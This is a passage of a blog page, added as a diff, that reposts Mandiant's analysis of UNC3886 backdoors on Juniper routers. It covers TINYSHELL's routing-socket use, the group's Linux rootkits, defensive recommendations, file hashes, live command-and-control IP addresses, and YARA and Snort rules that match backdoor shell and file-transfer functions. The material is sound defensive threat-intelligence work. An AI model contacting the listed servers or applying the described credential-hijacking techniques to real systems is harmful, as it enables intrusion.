+<p>All the previously listed samples create an <code>AF_ROUTE</code> socket using <code>socket(AF_ROUTE(17), SOCK_SEQPACKET(5), 0)</code>. Running these samples on a standard FreeBSD system would return an invalid socket, hence we believe this to be a JunosOS specific implementation.</p>
+<p>We believe that this socket is used to establish a connection for communicating with the operating system&rsquo;s routing subsystem. The <code>AF_ROUTE</code> constant designates the socket family for routing operations, and <code>SOCK_SEQPACKET</code> specifies a reliable, message-oriented connection. This socket is used to read and write a packet similar in structure to <code>rt_*</code> messages on OpenBSD to retrieve the interface index. From all the samples, only <code>oemd</code> uses the <code>ifinfo</code> command to retrieve the interface index, while other samples are using a custom <code>rt_*</code> messages via the socket.</p>
+<p>The custom message contains an interface name and a logical sub interface. On Juniper routing devices, instead of tagging packets with VLAN IDs, sub-interfaces act as distinct interfaces with their own IP addresses, routing configurations, and potentially different security policies. The interface index value is then passed into a <code>setsockopt</code> call for a command and control socket either TCP or UDP.</p>
+<h2 id="activity-in-linux-environments">Activity in Linux Environments</h2>
+<p>Mandiant continued to observe UNC3886 leverage similar TTPs and use of the same malware and utilities as detailed in <a href="https://cloud.google.com/blog/topics/threat-intelligence/uncovering-unc3886-espionage-operations">our previous blog post</a> as follows:</p>
+<ul>
+<li>
+<p>Command execution and persistence using a combination of rootkits and utilities, including REPTILE and MEDUSA with SEAELF loader, and BUSYBOX.</p>
+</li>
+<li>
+<p>Instead of using the publicly available kubo/injector as noted previously, Mandiant observed UNC3886 deployed PITHOOK along with a custom SSH server based on the publicly available <a href="https://github.com/wzshiming/sshd">wzshiming/sshd</a> project to <a href="https://cloud.google.com/blog/topics/threat-intelligence/investigating-ivanti-exploitation-persistence/?e=48754805#:~:text=or%20process%20ID.-,PITHOOK,-hooks%20the%20accept">hijack</a> SSH authentications and capture SSH credentials.</p>
+</li>
+<li>
+<p>TACACS+ daemon binary was replaced by a backdoored version of the binary with similar malicious functions for capturing credentials.</p>
+</li>
+<li>
+<p>Use of GHOSTTOWN malware for anti-forensics purposes.</p>
+</li>
+</ul>
+<p>Mandiant’s investigation did not observe evidence of data staging and exfiltration.</p>
+<h2 id="outlook-and-implications">Outlook and Implications</h2>
+<p>This blog post further highlights China-nexus espionage actors  are continuing to compromise networking infrastructure with custom malware ecosystems. While UNC3886 previously focused their operations on network edge devices, this activity demonstrated they’re also targeting internal networking infrastructure, such as Internet Service Provider (ISP) routers.</p>
+<p>Mandiant observed the threat actor targeting network authentication services, including the Terminal Access Controller Access-Control System (TACACS+), and terminal servers with access to the routers to gain privileged initial access.</p>
+<p>This privileged access allowed the threat actor to enter Junos OS shell mode and perform restricted operations. Investigating further actions taken by the threat actor was hampered by the challenges inherent in analyzing proprietary network devices, which required novel methods for artifact acquisition and analysis. </p>
+<p>Mandiant recommends organizations:</p>
+<ul>
+<li><strong>Upgrade Juniper devices and run security checks:</strong> Organizations should upgrade their Juniper devices to <a href="https://supportportal.juniper.net/JSA93446">the latest images</a> which contain mitigations and updated signatures for <a href="https://www.juniper.net/documentation/us/en/software/junos/security-services/topics/concept/juniper-malware-removal-tool.html">JMRT</a> and run JMRT Quick Scan and Integrity check after the upgrade. </li>
+<li><strong>Secure Authentication:</strong> Implement a centralized Identity and Access Management (IAM) system with robust multi-factor authentication (MFA) and granular role-based access control (RBAC) for managing network devices.</li>
+<li><strong>Configuration Management:</strong> Implement a network configuration management that supports configuration validation against defined templates and standards, with the ability to automatically remediate deviations or trigger alerts for manual intervention.</li>
+<li><strong>Enhanced Monitoring:</strong> Address and prioritize high-risk administrative activities and implement monitoring solutions with a process to regularly review the effectiveness of detection.</li>
+<li><strong>Vulnerability Management:</strong> Prioritize patching and mitigation of vulnerabilities in network devices, including those in lesser-known operating systems.</li>
+<li><strong>Device Lifecycle Management</strong>: Implement a device lifecycle management program that includes proactive monitoring, automated software updates, and end-of-life (EOL) replacement planning to ensure network devices are always supported and secure. </li>
+<li><strong>Security Hardening:</strong> Strengthen the security posture of network devices, administrative devices and systems used for managing network devices by implementing strict access controls, network segmentation, and other security measures.</li>
+<li><strong>Threat Intelligence:</strong> Proactively leverage threat intelligence to continually evaluate and improve the effectiveness of security controls against emerging threats.</li>
+</ul>
+<p>The compromise of routing devices is a recent trend in the tactics of espionage-motivated adversaries as it grants the capability for a long-term, high-level access to the crucial routing infrastructure, with a potential for more disruptive actions in the future. A concerted effort is required to safeguard these critical systems and ensure the continued stability and security of the internet.</p>
+<p>Organizations potentially impacted by this campaign are strongly advised to engage <a href="https://services.google.com/fh/files/misc/custom_threat_hunt_datasheet.pdf">Mandiant&rsquo;s Custom Threat Hunt service</a>. Mandiant&rsquo;s team of security experts can proactively identify and mitigate hidden threats, providing clarity and confidence in your security posture.</p>
+<h2 id="acknowledgement">Acknowledgement</h2>
+<p>This analysis would not have been possible without the assistance from analysts across Google Threat Intelligence Group and Mandiant’s FLARE. A special thanks goes to Paul Tarter, Adam Markun, and Ange Albertini who contributed to analysis of the malware detailed in this blog post.</p>
+<h2 id="indicators-of-compromise">Indicators of Compromise</h2>
+<p>A Google Threat Intelligence Collection of IOCs is <a href="https://www.virustotal.com/gui/collection/69bf6e9649be869b4a0384bd4ce18ca2cad347b60998c31006a881a9f62cd8cc">available for registered users</a>. For Google Security Operations Enterprise+ customers, rules have been released to your Emerging Threats rule pack, and indicators of compromise (IOCs) listed in this blog post are available for prioritization with <a href="https://cloud.google.com/chronicle/docs/detection">Applied Threat Intelligence</a>.</p>
+<h3 id="host-based-indicators">Host-Based Indicators</h3>
+<p><strong>Filename</strong></p>
+<p><strong>Malware Family</strong></p>
+<p><strong>MD5</strong></p>
+<p><strong>SHA1</strong></p>
+<p><strong>SHA256</strong></p>
+<p>appid</p>
+<p>TINYSHELL</p>
+<p>2c89a18944d3a895bd6432415546635e</p>
+<p>50520639cf77df0c15cc95076fac901e3d04b708</p>
+<p>98380ec6bf4e03d3ff490cdc6c48c37714450930e4adf82e6e14d244d8373888</p>
+<p>irad</p>
+<p>TINYSHELL</p>
+<p>aac5d83d296df81c9259c9a533a8423a</p>
+<p>1a6d07da7e77a5706dd8af899ebe4daa74bbbe91</p>
+<p>5bef7608d66112315eefff354dae42f49178b7498f994a728ae6203a8a59f5a2</p>
+<p>jdosd</p>
+<p>TINYSHELL</p>
+<p>8023d01ffb7a38b582f0d598afb974ee</p>
+<p>06a1f879da398c00522649171526dc968f769093</p>
+<p>c0ec15e08b4fb3730c5695fb7b4a6b85f7fe341282ad469e4e141c40ead310c3</p>
+<p>lmpad</p>
+<p>TINYSHELL</p>
+<p>5724d76f832ce8061f74b0e9f1dcad90</p>
+<p>f8697b400059d4d5082eee2d269735aa8ea2df9a</p>
+<p>5995aaff5a047565c0d7fe3c80fa354c40e7e8c3e7d4df292316c8472d4ac67a</p>
+<p>oemd</p>
+<p>TINYSHELL</p>
+<p>e7622d983d22e749b3658600df00296d</p>
+<p>cf7af504ef0796d91207e41815187a793d430d85</p>
+<p>905b18d5df58dd6c16930e318d9574a2ad793ec993ad2f68bca813574e3d854b</p>
+<p>to</p>
+<p>TINYSHELL</p>
+<p>b9e4784fa0e6283ce6e2094426a02fce</p>
+<p>01735bb47a933ae9ec470e6be737d8f646a8ec66</p>
+<p>e1de05a2832437ab70d36c4c05b43c4a57f856289224bbd41182deea978400ed</p>
+<p>oemd</p>
+<p>TINYSHELL</p>
+<p>bf80c96089d37b8571b5de7cab14dd9f</p>
+<p>cec327e51b79cf11b3eeffebf1be8ac0d66e9529</p>
+<p>3751997cfcb038e6b658e9180bc7cce28a3c25dbb892b661bcd1065723f11f7e</p>
+<p>lmpad</p>
+<p>TINYSHELL</p>
+<p>3243e04afe18cc5e1230d49011e19899</p>
+<p>2e9215a203e908483d04dfc0328651d79d35b54f</p>
+<p>7ae38a27494dd6c1bc9ab3c02c3709282e0ebcf1e5fcf59a57dc3ae56cfd13b4</p>
+<h3 id="network-indicators">Network Indicators</h3>
+<p><strong>Description</strong></p>
+<p><strong>Indicator</strong></p>
+<p>TINYSHELL Command and Control server</p>
+<p>129.126.109.50:22</p>
+<p>TINYSHELL Command and Control server</p>
+<p>116.88.34.184:22</p>
+<p>TINYSHELL Command and Control server</p>
+<p>223.25.78.136:22</p>
+<p>TINYSHELL Command and Control server</p>
+<p>45.77.39.28:22</p>
+<p>TINYSHELL Command and Control server</p>
+<p>101.100.182.122:22</p>
+<p>TINYSHELL Command and Control server</p>
+<p>118.189.188.122:22</p>
+<p>TINYSHELL Command and Control server</p>
+<p>158.140.135.244:22</p>
+<p>TINYSHELL Command and Control server</p>
+<p>8.222.225.8:22</p>
+<h2 id="detection">Detection</h2>
+<h3 id="yara-l-rules">YARA-L Rules</h3>
+<p>Relevant rules are available in the Google SecOps Mandiant Intel Emerging Threats <a href="https://cloud.google.com/chronicle/docs/detection/curated-detections">curated detections</a> rule set.</p>
+<ul>
+<li>
+<p>SEAELF Installer Execution</p>
+</li>
+<li>
+<p>GHOSTTOWN Utility Execution</p>
+</li>
+<li>
+<p>REPTILE Rootkit Command Line Argument Tampering</p>
+</li>
+<li>
+<p>REPTILE Rootkit Cmd Component Usage</p>
+</li>
+<li>
+<p>REPTILE Rootkit Shell Component Usage</p>
+</li>
+<li>
+<p>REPTILE Rootkit Hide Command Usage</p>
+</li>
+</ul>
+<h3 id="yara-rules">YARA Rules</h3>
+<pre tabindex="0"><code>rule M_Hunting_PacketEncryptionLayer_1
+{
+    meta:
+        author = &#34;Mandiant&#34;
+    strings:
+        $pel_1 = &#34;pel_client_init&#34;
+        $pel_2 = &#34;pel_server_init&#34;
+        $pel_3 = &#34;pel_setup_context&#34;
+        $pel_4 = &#34;pel_send_msg&#34;
+        $pel_5 = &#34;pel_recv_msg&#34;
+        $pel_6 = &#34;pel_send_all&#34;
+        $pel_7 = &#34;pel_recv_all&#34;
+        $pel_8 = &#34;pel_errno&#34;
+        $pel_9 = &#34;pel_context&#34;
+        $pel_10 = &#34;pel_ctx&#34;
+        $pel_11 = &#34;send_ctx&#34;
+        $pel_12 = &#34;recv_ctx&#34;
+    condition:
+        4 of ($pel_*)
+}
+</code></pre><pre tabindex="0"><code>rule M_Hunting_TINYSHELL_5
+{
+    meta:
+        author = &#34;Mandiant&#34;
+    strings:
+        $tsh_1 = &#34;tsh_get_file&#34;
+        $tsh_2 = &#34;tsh_put_file&#34;
+        $tsh_3 = &#34;tsh_runshell&#34;
+        $tshd_1 = &#34;tshd_get_file&#34;
+        $tshd_2 = &#34;tshd_put_file&#34;
+        $tshd_3 = &#34;tshd_runshell&#34;
+    condition:
+        all of ($tshd_*) or all of ($tsh_*)
+}
+</code></pre><h3 id="snortsuricata-rules">Snort/Suricata Rules</h3>
+<pre tabindex="0"><code>alert udp any any -&gt; any any ( msg:&#34;M_Backdoor_TINYSHELL_deadbeef_1&#34;; 
+dsize:&gt;15; content:&#34;|44 31 3A 14 45 95 6A 73|&#34;; offset: 0; depth:8; 
+threshold:type limit,track by_src,count 1,seconds 3600; sid:1000000; rev:1; )
+
+alert udp any any -&gt; any any ( msg:&#34;M_Backdoor_TINYSHELL_deadbeef_2&#34;; 
+dsize:&gt;15; content:&#34;|64 11 1A 34 65 B5 4A 53|&#34;; offset: 0; depth:8; 
+threshold:type limit,track by_src,count 1,seconds 3600; sid:1000001; rev:1; )
+
+alert icmp any any -&gt; any any ( msg:&#34;M_Backdoor_TINYSHELL_uSarguuS62bKRA0J&#34;; 
+content:&#34;|f3 d5 e7 f4 e1 f3 f3 d5 b0 b4 e4 cd d4 c7 b6 cc|&#34;; threshold:type 
+limit,track by_src,count 1,seconds 3600; sid:1000002; rev:1; )
+
+alert udp any any -&gt; any any ( msg:&#34;M_Backdoor_TINYSHELL_0b3330c0b41d1ae2&#34;; 
+dsize:&gt;27; content:&#34;|c5 c4 ec 4d|&#34;; offset: 0; depth:4; content:&#34;|a6 04 ed 83 
+92 46 ce 40 9a 34 8c 7b 5a d6 e5 0d|&#34;; offset:12; depth:16; threshold:type 
+limit,track by_src,count 1,seconds 3600; sid:1000003; rev:1; )
+</code></pre><h4 id="source"><a href="https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-targets-juniper-routers/">Source</a></h4>
+<!-- raw HTML omitted -->
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/posts/2025-03-20-srsly-risky-biz-chinas-mss-gets-persona/">Srsly Risky Biz Chinas MSS gets personal</a></li>
+				
+				<li><a href="/posts/2025-03-19-risky-bulletin-google-buys-wiz-for-32-b/">Risky Bulletin Google buys Wiz for 32 billion</a></li>
+				
+				<li><a href="/posts/apple-inc-sent-you-a-payment-request-payoneer-invoices-other-microsoft-enabled-scams/">“Apple Inc sent you a payment request” Payoneer invoices; other Microsoft-enabled scams</a></li>
+				
+				<li><a href="/posts/glasses-that-transcribe-text-to-audio/">“Glasses” That Transcribe Text To Audio</a></li>
+				
+				<li><a href="/posts/5-best-linux-centos-replacement-options-alternatives/">&lt;div&gt;5 Best Linux CentOS Replacement Options &amp; Alternatives&lt;/div&gt;</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2025 <a href="https://ghariib.ir/"><b>Alireza Gharib. All right reserved</b></a>.
+	<a href="https://github.com/Gharib110"><b>Github</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
